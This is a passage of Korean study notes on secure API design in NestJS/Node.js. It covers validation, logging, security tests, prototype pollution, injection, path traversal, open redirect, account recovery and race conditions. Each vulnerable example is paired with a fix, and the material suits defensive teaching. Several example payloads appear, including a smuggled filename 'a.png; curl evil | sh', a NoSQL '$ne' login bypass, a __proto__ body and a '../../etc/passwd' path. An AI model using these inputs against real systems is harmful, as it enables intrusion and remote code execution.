- 표준 헤더: `Deprecation`(폐기 시작 시각), `Sunset`(종료 일시), `Link`(폐기 정책 문서, 선택). 일부 게이트웨이는 만료일을 설정하면 `Sunset` 헤더를 자동으로 붙여 준다. (9.1)
- 문제는 "종료를 잊는 것". 수동 절차면 반드시 좀비 API가 남는다. → **종료를 자동화**하고, 게이트웨이로 노출 버전을 선언적으로 관리한다.
- 사례(Shopify): 옛 버전의 클라우드 메타데이터 서비스가 남아 있다가 SSRF로 SSH 키가 유출됐다. **옛 것은 위험 자산**이다.

> 🔗 NestJS 연결: `app.enableVersioning()`으로 버전을 명시하고, 폐기 대상 컨트롤러에 인터셉터로 `Deprecation`/`Sunset` 헤더를 붙인다.

> 📖 원문: 5.6, 9.1

### 18. 외부 API를 안전하게 소비하기

#### 18.1 위험
- 결제·이메일·지도·IdP 같은 서드파티 응답은 **믿을 수 없는 입력**이다. 상대가 침해되면 악성 값(SQL 조각, 스크립트 태그)이 우리 시스템으로 들어온다.
- 외부 API가 죽거나 이상한 응답을 주면 우리 서비스가 연쇄 장애를 겪는다.

#### 18.2 방어
- 외부 응답도 **스키마로 검증**한다. 열거형 값이면 허용 목록만 통과시킨다. 실패하면 저장하지 않고 알림을 띄운다.
- DB 쿼리는 언제나 **파라미터화**(ORM/바인딩)한다. 외부 데이터를 문자열로 SQL에 붙이지 않는다.
- 화면에 그대로 출력하는 값은 XSS 정제와 CSP를 고려한다.
- <strong>타임아웃, 재시도 제한, 서킷 브레이커, 우아한 성능 저하(graceful degradation)</strong>로 연쇄 장애를 막는다.

```ts
// (보충) 저자 작성 예시. 원서는 Python Pydantic으로 같은 검증을 한다.
import { z } from 'zod';
const StatusSchema = z.object({ status: z.enum(['muggle', 'wizard', 'witch']) });

const raw = await this.http.axiosRef.get(url, { timeout: 3000 });
const { status } = StatusSchema.parse(raw.data); // 검증 실패 시 예외 → 저장 안 함
```

> 📖 원문: 5.7–5.8

### 19. 설계 단계에서 막는 취약점 (Secure by design)

책의 가장 유용한 관점이다. **"런타임에 개발자가 조심하기"가 아니라 "스펙에 제약을 박아서 애초에 불가능하게"** 만든다.

#### 19.1 무제한 페이지네이션
- `perPage`, `page`에 상한/하한이 없으면 `perPage=100000000`이나 음수로 서버를 무너뜨린다.
- 최소/최대를 명시한다. 스크래핑을 막으려면 `page` 최대값도 둔다.

```ts
// (보충) 원서는 OpenAPI 스펙(minimum/maximum)으로 표현. 아래는 NestJS 번역 예시
class ListDto {
  @IsInt() @Min(1) @Max(100) page = 1;
  @IsInt() @Min(10) @Max(100) perPage = 20;
}
```

#### 19.2 예측 가능한 ID
- 1, 2, 3 증가 정수를 외부에 노출하면 리소스 열거(enumeration) 공격이 쉬워진다. (Clubhouse 130만 건 유출 사례)
- **UUID**를 쓰거나, 내부는 정수 PK로 두고 외부용 <strong>공개 ID(UUID)</strong>를 따로 둔다.
- 하지만 UUID를 쓴다고 BOLA가 해결되는 것은 아니다. **접근 제어 검사는 반드시 유지**한다.

#### 19.3 제약 없는 입력
- 점수 `rating: 500`, 리뷰 길이 무제한, 필터 문자열에 SQL 인젝션.
- 숫자는 `min/max`, 문자열은 `maxLength`, 선택지는 `enum`으로 제한한다.
- 정렬 필드(`sortBy`)는 **열거형으로 허용 필드만** (숨은 컬럼 발견 방지).
- 자유 텍스트 필터는 제약이 어려우므로 **쿼리 파라미터 바인딩**과 WAF로 방어한다.

#### 19.4 유연한 스키마의 위험
- **선택 속성**: 인쇄본/전자책을 한 스키마로 합치면 `pages` 없는 인쇄본 같은 오염 데이터가 저장되어 나중에 다른 엔드포인트가 500 에러를 낸다. → **모델별 스키마를 분리**하고 공통 부분은 합성(composition)으로.
- **추가 속성 허용**: JSON Schema는 기본이 "선언 안 한 속성도 허용"이라 `{"quantity":1,"status":"paid"}` 같은 주문 상태 조작이 가능하다. → `additionalProperties: false`. 스키마를 `allOf`로 합성했다면 `additionalProperties`는 로컬 범위라 모순이 생기므로 `unevaluatedProperties: false`를 쓴다. (NestJS에선 `forbidNonWhitelisted`에 해당 — 보충)

#### 19.5 서버 전용 속성을 입력에 열지 않기
- `id`, `status`, `createdAt`, `role`은 서버가 정한다. 입력 모델에 넣지 않는다. (11절과 같은 원칙)

> 🔗 NestJS 연결: DTO + `class-validator`(`@IsEnum`, `@Max`, `@MaxLength`) + `ParseUUIDPipe`. 페이지네이션/정렬은 재사용 가능한 공통 DTO로 만든다.

> 📖 원문: 6.1–6.5

### 20. 안전한 사용자 플로우 설계

- API는 UI가 정해준 순서를 강제하지 않는다. 공격자는 **단계를 건너뛰어** `POST /carts`나 `POST /checkout`을 바로 호출할 수 있다.
- 책의 목표: 봇을 완전히 없앨 수는 없으니 **봇이 사람처럼 행동하도록 강제**해 공격 비용을 올리는 것. 사람은 단계 사이에 몇 초 걸리고, 봇은 마이크로초~밀리초 만에 끝낸다.
- 책이 제안하는 방법:
  - 플로우를 형식적으로 문서화한다. (OpenAPI Initiative의 **Arazzo** 스펙: 단계 순서, 입력, 성공 조건, 단계 간 출력 전달을 기술)
  - 민감한 플로우는 **모든 단계에 인증**을 요구한다. 익명 봇을 막고 행동 추적이 쉬워진다.
  - 세션 기반 **플로우 트래커**(쿠키 등)로 사용자가 밟은 단계를 기록하고, 사용자당 활성 트래커 세션은 하나만 허용한다.
  - 2단계부터는 앞 단계를 거쳤는지(예: 가격 계산 전에 장바구니 담기) 확인하고, 단계 간 시간 간격을 추적한다. 플로우를 마치면 트래커를 초기화한다.
  - 사람도 중간에 다른 페이지를 보는 등 순서에서 조금 벗어난다. 이런 약간의 불규칙성은 오히려 사람이라는 신호다.
  - 더 민감하면 CAPTCHA, 사용자별 위험 프로필, mTLS·메시지 서명을 결합한다.
- (보충) 서버가 상태(장바구니 → 결제 진행 → 완료)를 저장하고 허용된 전이만 받는 상태 기계로 구현하는 것, 결제·재고처럼 되돌리기 어려운 단계에 멱등성 키와 트랜잭션을 쓰는 것은 일반적인 설계 관행이며 원서 내용은 아니다.

> 📖 원문: 6.6

### 21. 안전한 배포: 게이트웨이, 네트워크, WAF

#### 21.1 API 게이트웨이가 해주는 일
- 단일 진입점 (섀도/좀비 API 억제, 노출 버전 선언적 관리)
- 인증(JWT 검증, mTLS 등) 1차 처리
- 스펙 기반 요청/응답 검증
- 보안 헤더(CORS, HSTS, CSP) 일괄 적용
- 속도 제한, 접근 로그, 사용량 분석
- 주의: 게이트웨이는 선택 후 바꾸기 어렵다("한 방향 결정"). 그리고 코드 쪽 검증 폴백도 유지한다.

#### 21.2 네트워크 분리
- 인터넷에 열린 층(**DMZ**: 게이트웨이, 로드밸런서, WAF)과 사설 서브넷(서비스, DB)을 나눈다.
- **DB는 인터넷에 노출하지 않는다.** 필요하면 배스천(점프 호스트)을 거친다.
- 내부 API도 사설 서브넷에 두어 "기본적으로 외부 접근 불가"로 만든다. 단, 이것이 인증 생략의 이유는 아니다(5절).

#### 21.3 WAF와 DDoS 방어
- WAF는 리버스 프록시로 앞단에 두어 SQL 인젝션, XSS 같은 알려진 패턴을 막고, 스펙을 주면 요청 스키마 검증도 해 준다. 제로데이와 3~6계층 공격 완화에도 쓰인다.
- 한계: 패턴 매칭은 너무 느슨하면 우회되고 너무 엄격하면 정상 요청을 막는다. 입력을 "정제"하는 방식은 우회 공격(예: `'+o//r+1=1--`)에 당할 수 있다. WAF를 믿고 방어를 느슨히 하는 과신이 문제다. 비즈니스 플로우 공격은 일반 도구가 못 본다(13절).
- 대규모 트래픽·포트 스캔 같은 하위 계층 공격은 Cloudflare, Akamai 같은 전문 DoS 방어 서비스와 서버 하드닝(불필요한 포트 닫기)으로 대응한다. HTTP/2 Rapid Reset 같은 프로토콜 취약점은 클라우드 내장 방어 활용을 권한다.

> 📖 원문: 9.1–9.4

### 22. 로깅·감사·관측성(Observability) — 보안 관점

#### 22.1 로그·트레이스·메트릭
- **로그**: 사건 기록. **트레이스**: 한 요청이 지나간 여러 로그를 `traceId`로 연결. **메트릭**: 수치(요청 수, 지연, 에러율).
- 분산 환경에서 "어디서 잘못됐는지"는 `traceId` 없이는 찾기 어렵다. 요청마다 상관관계 ID를 심는다.
- **감사 추적(Audit trail)**: 누가, 언제, 어디서, 무엇을 했는지 기록. 규제·사고 조사·부인 방지(STRIDE의 R)에 필수다.

#### 22.2 무엇을 기록하나 (공격 탐지용)
- 401/403(권한 실패), 400/422(잘못된 입력), 인젝션 의심 요청, 지연이 이례적으로 긴 요청
- 사용자 식별자(`sub`), 요청 경로, 상태 코드, 지연, 트레이스 ID
- 재현을 위해 헤더/본문을 남기고 싶겠지만 → 다음 원칙을 지킨다.

#### 22.3 로그에 민감 정보를 남기지 않기
- 로그도 데이터다. PII·카드번호·토큰이 있으면 로그가 규제 대상이 되고 유출 지점이 된다.
- **민감 필드는 마스킹/제외**한다. `Authorization` 헤더, 비밀번호, 카드번호는 절대 그대로 남기지 않는다.
- 예시 코드가 헤더 전체를 남기면 토큰이 로그에 저장된다. 실무에서는 반드시 걸러낸다.
- 로그는 stdout으로 내보내고 수집기(Fluentd 등)가 모으는 방식이 성능과 운영에 유리하다.

```ts
// (보충) 저자 작성 예시. 원서는 OpenTelemetry로 credit_card 필드를 로그에서 제외한다.
// pino 예시 — 민감 정보 자동 마스킹
const logger = pino({
  redact: ['req.headers.authorization', 'req.body.password', 'req.body.creditCard'],
});
```

#### 22.4 엔드포인트 남용 탐지
- 단일 로그 한 줄로는 안 보이는 공격이 있다. 예: 사용자 검색 API를 수천 번 두드려 계정을 수집(객체 열거).
- 이런 공격의 특징은 **같은 엔드포인트에 반복 호출**이다. → **엔드포인트/사용자별 카운터 메트릭**을 수집해 임계치 초과 시 경보한다.
- 관측성 데이터는 속도 제한, 계정 잠금, 차단 결정의 근거가 된다.

> 🔗 NestJS 연결: 전역 `Interceptor`로 요청 ID·사용자·경로·지연·상태 코드를 구조화 로그로 남기고, 감사 대상(권한 변경, 결제, 삭제)은 서비스 계층에서 별도 감사 이벤트로 기록한다.

> 📖 원문: 11.1–11.6

### 23. 보안 테스트 자동화

#### 23.1 전략
- 위협 모델에서 출발한다. 우리 API의 위협이 무엇인지 알아야 테스트 범위가 정해진다.
- **적은 노력으로 효과가 큰 것부터**: 인증 없는 호출, 남의 리소스 접근, 일반 사용자의 관리자 호출.
- 예: 불투명(opaque) 토큰을 쓰면 JWT 변조 테스트는 생략해도 된다.

#### 23.2 꼭 자동화할 4종 접근 제어 테스트

| 테스트 | 기대 결과 |
|---|---|
| 인증 누락/만료/변조 토큰으로 보호 엔드포인트 호출 | 401 |
| 사용자 A 토큰으로 사용자 B 리소스 요청 (BOLA) | 403 또는 404 |
| 일반 역할 토큰으로 관리자 엔드포인트 호출 (RBAC) | 403 |
| 조건부 권한(예: 계좌 검증 전 결제) | 거부 |

```ts
// (보충) 저자 작성 supertest 예시 — 원서(리스트 12.2~12.4)는 pytest로 같은 테스트를 보인다
it('BOLA: 다른 사용자의 주문은 조회할 수 없다', async () => {
  const other = await createOrder(userB);
  await request(app.getHttpServer())
    .get(`/orders/${other.id}`)
    .set('Authorization', `Bearer ${tokenOf(userA)}`)
    .expect(404); // 또는 403
});

it('RBAC: 일반 사용자는 관리자 API 접근 불가', async () => {
  await request(app.getHttpServer())
    .get('/admin/students')
    .set('Authorization', `Bearer ${tokenOf(normalUser)}`)
    .expect(403);
});
```

#### 23.3 비즈니스 플로우 테스트
- 쿠폰 재사용, 남의 쿠폰 사용 같은 시나리오를 통합 테스트로 만든다. 스캐너/WAF가 못 잡는 영역이다.

#### 23.4 참고

### 24. Node.js 특화 위험 ① — 프로토타입 오염과 동적 코드 실행

Part 6의 3절은 SQL 인젝션·ReDoS를 다뤘습니다. 이 절은 **JavaScript라서 생기는** 입력 처리 위험을 다룹니다.

#### 24.1 프로토타입 오염(Prototype Pollution)이란?
- JS의 일반 객체는 모두 `Object.prototype`을 물려받습니다. 이 **공유 객체에 값이 써지면 프로세스 안의 모든 객체가 동시에 바뀝니다.**
- 주된 통로: 요청 본문을 **재귀적으로 깊은 병합(deep merge)** 하거나, 사용자가 준 키로 `obj[key] = value`를 하는 코드.
- `JSON.parse`는 `"__proto__"`를 평범한 속성으로 만들기 때문에, 병합 단계까지 살아남습니다.

```ts
// ❌ 본문을 설정/사용자 객체에 깊은 병합
deepMerge(settings, req.body);
// body = { "__proto__": { "isAdmin": true } } 이면
// 이후 모든 객체에서 ({} as any).isAdmin === true → 권한 검사 통과
```

| 결과 | 설명 |
|---|---|
| 권한 우회 | `if (user.isAdmin)` 같은 검사가 모든 사용자에게 참 |
| 서비스 장애 | `toString` 등 기본 메서드가 덮여 곳곳에서 예외 |
| 원격 코드 실행 | 일부 템플릿 엔진은 오염된 옵션 키를 코드로 해석 |

#### 24.2 방어 (효과 큰 순서)
1. **신뢰할 수 없는 입력을 깊은 병합하지 않는다.** 스키마로 검증하고 필요한 필드만 **명시적으로 골라** 새 객체를 만듭니다. 이것이 문제 전체를 없앱니다.
2. 사용자가 키를 정하는 맵은 **`Object.create(null)`** 또는 `Map`으로 만듭니다(물려받을 프로토타입이 없음).
3. 필요하면 `JSON.parse`의 reviver로 `__proto__`·`constructor`·`prototype` 키를 버립니다.
4. 보조 수단: 기동 시 `Object.freeze(Object.prototype)`, `--disable-proto=throw` 플래그. 단, `--disable-proto`는 `constructor.prototype` 경로까지 막지는 못하므로 1번을 대신하지 않습니다.
- Node.js는 공식 보안 정책에서 프로토타입 오염을 "Node의 취약점이 아니라 **애플리케이션 책임**"으로 분류합니다. 런타임이 막아주지 않는다는 뜻입니다.

#### 24.3 동적 코드 실행과 안전하지 않은 역직렬화
- `eval`, `new Function`, `vm.runInContext`에 사용자 입력이 닿으면 곧 **원격 코드 실행**입니다. 웹 보안 교재는 이를 "동적 실행 인젝션"으로 묶고, **사용자 입력을 동적 실행 함수에 넘기지 않는 것**이 유일하게 확실한 방어라고 말합니다. (보충) 브라우저와 달리 Node.js의 `setTimeout`은 문자열 콜백을 거부(`ERR_INVALID_ARG_TYPE`)하므로 이 경로에 해당하지 않습니다.
- (보충) `node:vm`은 보안 샌드박스가 아닙니다(공식 문서 명시). 사용자 수식·규칙 기능이 필요하면 전용 파서(수식 라이브러리, JSON 기반 규칙)를 씁니다.
- (보충) 함수·클래스까지 복원하는 직렬화 라이브러리(`node-serialize` 류)나 YAML의 커스텀 태그로 외부 데이터를 역직렬화하지 않습니다. 외부 데이터는 **순수 JSON + 스키마 검증**이 기본입니다.

> 🔗 NestJS 연결: 전역 `ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })`와 DTO는 선언되지 않은 키를 걸러 1번 방어를 자동화합니다. (보충) 단, `Record<string, any>`·`@IsObject()`로 받은 자유 형식 필드는 이 보호 밖이니 깊은 병합 대상으로 쓰지 마세요.

> 📖 원문: Node.js 교재 44장(Node's threat model, Prototype pollution) / 웹 보안 완전 가이드 28.1–28.2(동적 실행 인젝션)

### 25. 백엔드 인터프리터 주입 — 명령·NoSQL 연산자·XML(XXE)

Part 6의 3.4절이 말한 "인젝션 = 데이터가 명령으로 해석되는 것"을 SQL 밖의 인터프리터에 적용합니다.

#### 25.1 OS 명령 주입: `exec` 대신 `execFile`
- `child_process.exec()`는 **셸을 띄워 문자열 전체를 해석**합니다. 입력에 `;`, `|`, `&`, 백틱, 줄바꿈이 있으면 다른 명령이 함께 실행됩니다.
- 별도 명령을 못 붙여도 **인자 주입**이 남습니다. 예: URL을 받는 도구에 `-O 경로`를 덧붙여 서버 파일을 덮어쓰기.

```ts
import { execFile } from 'node:child_process';

// ❌ exec(`convert ${filename} out.png`)  → filename = "a.png; curl evil | sh"
// ✅ 셸 없이 프로그램 + 인자 배열로 실행
execFile('convert', [filename, 'out.png'], cb); // filename은 허용 목록으로 검증된 값만(보충: '--'로 옵션 끝을 표시하는 관례는 지원하는 프로그램에서만 유효)
```

방어 원칙(우선순위 순):
1. **OS 명령을 호출하지 않는다.** 이미지 처리·압축·DNS 조회 등은 대부분 라이브러리/내장 API가 있습니다.
2. 불가피하면 `execFile`/`spawn` + 인자 배열, `shell: true` 옵션 금지.
3. 인자는 **허용 목록(allowlist)** 또는 영숫자 같은 좁은 문자 집합으로 검증하고, 벗어나면 **거부**(따옴표 이스케이프로 "고치려" 하지 않기).

#### 25.2 NoSQL 연산자 주입 (MongoDB)
- SQL이 아니어도 원리는 같습니다. 질의가 **문자열 조립**(`$where`에 JS 문자열)이거나, **객체를 그대로** 질의에 넣으면 구조가 바뀝니다.

```ts
// ❌ body = { "email": "a@b.com", "password": { "$ne": null } }
await users.findOne({ email: body.email, password: body.password });
// → "비밀번호가 null이 아닌" 사용자와 매칭 → 로그인 우회
```

- 방어: 값의 **타입을 먼저 검증**(문자열이어야 할 곳에 객체가 오면 거부), `$where`·`$function`·`mapReduce`에 사용자 입력 금지.
- (보충) Mongoose는 `mongoose.set('sanitizeFilter', true)`로 필터 안의 `$` 연산자 객체를 무력화할 수 있습니다. DTO의 `@IsString()`과 함께 이중으로 둡니다.

#### 25.3 XML 외부 엔티티(XXE) — 짧게
- XML 파서는 `<!DOCTYPE>` 안에 **외부 엔티티**(`SYSTEM "file:///..."`, `"http://내부주소"`)를 정의하면 그 내용을 읽어와 치환합니다.
- 결과: 서버 파일 유출, **서버가 내부망으로 요청(SSRF, 15절)**, 끝없는 스트림·중첩 엔티티 확장(Billion Laughs)으로 인한 DoS.
- 방어: XML 입력을 받지 않는 것이 최선. 받아야 한다면 **DTD·외부 엔티티 처리를 끈 파서 설정**을 쓰고, 문서 크기와 엔티티 확장을 제한합니다. (보충) SAML·SVG 업로드·오피스 문서(내부가 XML)도 XML 입력이라는 점을 놓치기 쉽습니다. libxml 바인딩 계열은 엔티티 치환 옵션(`noent` 등)을 켜지 않습니다.

> 🔗 NestJS 연결: DTO에 `@IsString()`·`@IsEmail()`을 두면 `{ "$ne": null }` 같은 객체는 Pipe 단계에서 400으로 끝납니다. 명령·XML 처리는 별도 Service에 격리해 리뷰 대상을 좁힙니다.

> 📖 원문: 웹 보안 완전 가이드 27.11(NoSQL 인젝션), 28.1–28.2(OS 명령 인젝션·방어), 28.5–28.6(XXE·Billion Laughs) / Node.js 교재 44장(Command injection)

### 26. 경로 탐색(Path Traversal)과 업로드·요청 크기 제한

Part 6의 3.5절(파일 업로드 기본 수칙)에서 **경로 처리와 크기 제한**을 구체화합니다.

#### 26.1 경로 탐색이란?
- 사용자 입력이 파일 경로가 될 때 `../`로 의도한 폴더 밖(`/etc/passwd`, `.env`, 소스 코드)에 접근하는 공격. 쓰기라면 실행 파일·설정 파일을 덮어씁니다.
- 흔한 실패한 방어: `../` 문자열 제거(`....//`가 제거 후 `../`가 됨), "확장자가 .jpg로 끝나는지" 검사, "uploads/로 시작하는지" 검사(`uploads/../../x`).
- Node 주의점: **`path.join()`·`path.normalize()`는 입력을 그대로 믿습니다.** `path.join('/data', '../../etc/passwd')`는 그냥 `/etc/passwd`가 됩니다.

#### 26.2 방어
1. **사용자 입력을 파일 경로로 쓰지 않는다.** 서버가 만든 ID(UUID)로 저장하고, 원래 파일명은 DB 메타데이터로만 보관합니다(다운로드 시 `Content-Disposition`의 표시 이름으로만 사용).
2. 써야 한다면 **완전히 해석(resolve)한 뒤 기준 폴더 안인지 확인**합니다. 정제("고치기") 대신 거부.

```ts
import { resolve, sep } from 'node:path';
const ROOT = resolve('/var/app/uploads');

function safePath(userPath: string): string {
  const full = resolve(ROOT, userPath);
  if (!full.startsWith(ROOT + sep)) throw new BadRequestException(); // sep 필수: uploads-evil 방지
  return full;
}
```

- 이 검사는 문자열 수준입니다. 폴더 안 심볼릭 링크가 밖을 가리킬 수 있으니 필요하면 `fs.realpath()`로 다시 확인합니다.
- 경로 탐색 시도는 **악의가 분명한 신호**이므로 보안 이벤트로 로깅합니다(22절).

#### 26.3 업로드·요청 크기 제한 (메모리 DoS 방지)

| 위험 | 대책 |
|---|---|
| 거대한 본문 스트리밍 | 본문 크기 상한. `Content-Length`를 믿지 말고 실제 바이트를 셈 |
| 거대한 업로드 파일 | 파일 크기·개수·필드 수 상한, 메모리 대신 스트림/객체 스토리지 |
| 압축 폭탄(10KB → 수 GB) | 압축 해제 시 `maxOutputLength` 지정 |
| 확장자·`Content-Type` 위장 | 파일 앞부분의 **매직 넘버**로 실제 형식 판별, 허용 목록만 통과 |
| 느린 요청(slow drip) | `server.headersTimeout`·`requestTimeout` 설정 |

```ts
@Post('avatar')
@UseInterceptors(FileInterceptor('file', { limits: { fileSize: 5 * 1024 * 1024, files: 1 } }))
upload(@UploadedFile(new ParseFilePipe({
  validators: [new MaxFileSizeValidator({ maxSize: 5 * 1024 * 1024 }),
               new FileTypeValidator({ fileType: /^image\/(png|jpeg)$/ })],
})) file: Express.Multer.File) { /* UUID 키로 S3에 저장 */ }
```

> 🔗 NestJS 연결: (보충) JSON 본문 상한은 `app.useBodyParser('json', { limit: '1mb' })`로 조정합니다. `FileTypeValidator`가 매직 넘버까지 보는지는 Nest 버전마다 다르니 확인하세요.

> 📖 원문: 웹 보안 완전 가이드 28.3–28.4(경로 순회·파일 인클루전) / Node.js 교재 44장(Path traversal, Request body limits, Decompression bombs)

### 27. 오픈 리다이렉트와 "헤더를 믿는" 실수 (Host·X-Forwarded-*)

#### 27.1 오픈 리다이렉트(Open Redirect)
- `/login?next=https://evil.com`처럼 **사용자가 정한 주소로 리다이렉트**해 주는 기능. 링크가 우리 도메인으로 시작하므로 피싱 미끼가 그럴듯해집니다.
- 단독 위험은 XSS보다 작지만 **다른 공격의 부품**이 됩니다. SSRF 목적지 검사 통과 후 리다이렉트로 내부망 도달, OAuth 콜백에서 인가 코드·토큰 유출 등.
- 방어 우선순위:
  1. 목적지를 사용자 입력으로 받지 않는다(리다이렉트 페이지 제거).
  2. **간접 참조**: 허용 목적지 목록을 서버에 두고 키/인덱스만 받는다.
  3. 받아야 한다면 **상대 경로만 허용**: `/` 하나로 시작하고 `//`·`/\`로 시작하지 않으며 스킴(`:`)이 없어야 함. 절대 URL이면 `https://app.example.com/`(**끝의 `/` 포함**)으로 시작하는지 확인. 모두 **거부 방식**.

```ts
function safeNext(next?: string): string {
  if (!next || !/^\/(?![\/\\])/.test(next)) return '/';       // 상대 경로만
  const url = new URL(next, 'https://app.example.com');
  return url.origin === 'https://app.example.com' ? url.pathname + url.search : '/';
}
```

- (보충) OAuth/OIDC의 `redirect_uri`는 등록된 값과 **정확히 일치**해야 합니다(접두사·와일드카드 매칭 금지).

#### 27.2 Host 헤더를 서버의 "자기 이름"으로 쓰지 않기
- `Host`는 **클라이언트가 쓴 문자열**입니다. 프레임워크가 이 값으로 절대 URL을 만들면, 공격자가 `Host: evil.com`으로 **비밀번호 재설정을 요청**했을 때 피해자 메일함에 `https://evil.com/reset?token=...` 링크가 도착합니다. 피해자가 누르면 토큰이 공격자에게 갑니다.
- 방어: 이메일 링크·리다이렉트·콜백 URL은 **설정값(`APP_BASE_URL`)으로만** 만듭니다. 리버스 프록시에서 허용 호스트 외 요청은 거부합니다.

#### 27.3 X-Forwarded-For / X-Forwarded-Host
- 프록시 뒤에서는 실제 IP를 이 헤더에서 읽지만, **신뢰하는 프록시가 덮어쓰지 않으면 클라이언트가 마음대로 넣을 수 있습니다.** 속도 제한(14절)·감사 로그(Part 6 11절)·IP 허용 목록이 우회됩니다.
- `trust proxy: true`(무조건 신뢰) 대신 **실제 프록시 주소/홉 수만 신뢰**하도록 범위를 좁힙니다. 인증된 요청의 속도 제한 키는 IP보다 사용자 ID가 낫습니다.

> 🔗 NestJS 연결: `app.set('trust proxy', 'loopback')`처럼 범위를 지정하고, 기준 URL은 `ConfigService`로 주입합니다. 리다이렉트 검증 함수는 공통 유틸로 두고 `@Redirect()`·`res.redirect()` 전에 반드시 거칩니다.

> 📖 원문: 웹 보안 완전 가이드 8.6(헤더의 신뢰성: Host·X-Forwarded-For), 35.3(오픈 리다이렉션 방어), 35.6(간접 참조) / NestJS 교재 26장(Proxies and the real client IP)

### 28. 계정 복구·이메일 인증 토큰과 MFA

교재는 "주 로그인에서 막은 취약점이 **비밀번호 변경·분실·로그인 유지 같은 부속 기능**에서 되살아난다. 공격자에게는 이쪽이 더 약한 고리"라고 강조합니다. 9절(깨진 인증)과 Part 6의 5절(토큰 생성·해시 저장)을 흐름 단위로 묶습니다.

#### 28.1 비밀번호 재설정 흐름
```
요청(이메일 입력) → 항상 같은 응답 → [존재하면] 일회용 토큰 메일 발송
→ 링크 클릭 → 토큰 검증 → 새 비밀번호 설정 → 토큰 폐기·전체 세션 폐기 → 변경 알림 메일
```

| 원칙 | 이유 |
|---|---|
| 토큰은 **추측 불가·일회용·짧은 만료**(예: 15~60분) | 예측·재사용·장기 노출 차단 |
| DB에는 토큰 **해시**만 저장 (Part 6 5절) | DB 유출 시 재사용 방지 |
| 메일은 **등록된 주소로만** 발송. 요청 본문/숨은 필드로 받은 주소 금지 | 공격자 메일함으로 링크 발송 방지 |
| 링크의 기준 URL은 설정값 (27.2절) | Host 헤더 조작 방지 |
| 응답·소요 시간이 **계정 존재 여부와 무관** | 계정 열거(User enumeration) 방지 |
| 재설정 요청만으로 기존 비밀번호를 무효화하지 않음 | 남이 계속 요청해 계정을 잠그는 DoS 방지 |
| 재설정 후 **로그인 상태로 바로 진입시키지 않음**, 모든 세션·리프레시 토큰 폐기 | 탈취된 세션 정리 |
| 변경 사실을 **대역 외(이메일)로 통지**, 메일에 비밀번호 미포함 | 피해자가 빨리 알아챔 |
| 비밀번호 힌트·사용자 지정 보안 질문 금지 | 답의 공간이 작고 공개 정보인 경우가 많음 |

- (보충) 토큰이 URL에 담길 수밖에 없으므로 재설정 페이지에 `Referrer-Policy: no-referrer`를 두고, 페이지 진입 즉시 토큰을 본문 요청으로 교환합니다.

#### 28.2 계정 열거(User enumeration)를 막는 곳
로그인뿐 아니라 **가입("이미 가입된 이메일")·재설정·비밀번호 변경**에서도 새어 나갑니다.
- 가입은 화면에서 구분하지 말고 "인증 메일을 보냈습니다"로 통일한 뒤, 이미 있는 주소에는 "이미 가입되어 있음" 안내 메일을 보냅니다. (보충)
- 사용자가 없을 때도 **더미 해시 비교**를 수행해 응답 시간 차이를 줄입니다. (보충)

```ts
const user = await this.users.findByEmail(email);
const ok = await argon2.verify(user?.passwordHash ?? DUMMY_HASH, password); // 없는 계정도 같은 비용
if (!user || !ok) throw new UnauthorizedException('이메일 또는 비밀번호가 올바르지 않습니다');
```

#### 28.3 이메일 인증·이메일 변경 (보충)
- 인증 토큰도 28.1과 같은 규칙(일회용·만료·해시 저장)을 따릅니다.
- 이메일 변경은 **현재 비밀번호 재확인 → 새 주소 인증 완료 후에 교체 → 옛 주소로 알림**. 인증 전에 바꾸면 오타·탈취 한 번에 계정 복구 수단을 잃습니다.

#### 28.4 MFA(다중 요소 인증) 개요
- 요소: **아는 것**(비밀번호), **가진 것**(인증 앱·보안 키), **본인 자체**(생체). 서로 다른 종류를 둘 이상 요구하는 것이 MFA입니다.
- 다단계 로그인 설계 원칙(교재): 단계 진행 상태는 **서버 세션에만** 저장하고, 매 단계 시작 시 **이전 단계를 정말 통과했는지** 확인하며, 실패 위치를 알려주지 않습니다.
- (보충) 강도 비교: SMS < TOTP(인증 앱) < WebAuthn/패스키(도메인에 묶여 **피싱 저항**). SaaS 관리자·결제 권한 계정부터 강제합니다.
- (보충) 실무 규칙: TOTP 코드 시도에도 속도 제한, 복구 코드는 일회용·해시 저장, MFA 해제·변경은 재인증 필수, 민감 작업 직전 재확인(step-up).

> 🔗 NestJS 연결: "1단계 통과(MFA 대기)" 상태는 정식 액세스 토큰과 다른 **제한 토큰/세션 플래그**로 표현하고, 일반 `AuthGuard`가 이를 받아주지 않게 합니다. 재설정·MFA 엔드포인트에는 `@Throttle()`로 더 엄격한 한도를 둡니다.

> 📖 원문: 웹 보안 완전 가이드 22.4(비밀번호 변경·분실·로그인 유지), 22.8(다단계 로그인·계정 복구 설계), 8.6(Host 헤더와 재설정 링크)

### 29. 경쟁 상태(Race Condition)가 만드는 로직 결함

13절은 쿠폰 재사용을 "비즈니스 플로우 남용"으로 다뤘습니다. 여기서는 **요청을 동시에 보내기만 해도** 규칙이 깨지는 구조적 원인을 봅니다.

#### 29.1 "확인 후 실행(check-then-act)"의 틈
```ts
// ❌ 같은 쿠폰으로 동시에 요청 10개 → 10개 모두 usedAt === null을 보고 통과
const coupon = await repo.findOne({ where: { id } });
if (coupon.usedAt) throw new ConflictException();
await applyDiscount(order, coupon);
await repo.update(id, { usedAt: new Date() });
```
- Node는 단일 스레드지만 **`await` 사이에 다른 요청이 끼어듭니다**(Part 2). 서버가 여러 대면 더 말할 것도 없습니다.
- 같은 구조의 사고: 잔액보다 많이 출금, 1인 1회 혜택 중복 수령, 재고 초과 판매, 초대 보상 중복 지급, 무료 체험 반복 생성.
- 교재의 로그인 경쟁 사례는 <strong>요청 간 공유되는 상태(정적 변수)</strong>에 사용자 정보를 두어, 동시 로그인 시 남의 계정으로 들어가지는 결함이었습니다. Node에서는 모듈 전역 변수·싱글톤 서비스의 필드가 같은 위험입니다.

#### 29.2 방어: 확인과 변경을 하나로 (보충)

| 방법 | 예 |
|---|---|
| **조건부 원자적 갱신** | `UPDATE coupons SET used_at=now() WHERE id=$1 AND used_at IS NULL` → 영향받은 행이 0이면 거부 |
| 조건을 갱신식에 넣기 | `UPDATE accounts SET balance = balance - $1 WHERE id=$2 AND balance >= $1` |
| **유니크 제약** | `(user_id, promotion_id)` 유니크 → 두 번째 INSERT 실패 |
| 행 잠금 | 트랜잭션 + `SELECT ... FOR UPDATE` (짧게 유지) |
| 멱등성 키 | 재시도·더블클릭 중복 방지 (Part 5 11.3) |

```ts
const { count } = await prisma.coupon.updateMany({
